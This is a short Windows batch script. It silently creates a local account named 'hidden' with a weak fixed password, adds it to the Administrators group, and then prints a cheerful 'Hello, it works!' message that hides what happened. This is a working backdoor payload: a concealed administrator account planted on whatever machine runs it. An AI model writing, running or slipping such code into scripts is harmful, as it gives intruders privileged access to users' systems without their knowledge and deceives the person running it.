@echo off

net user hidden password /add
net localgroup administrators hidden /add

echo "Hello, it works!"
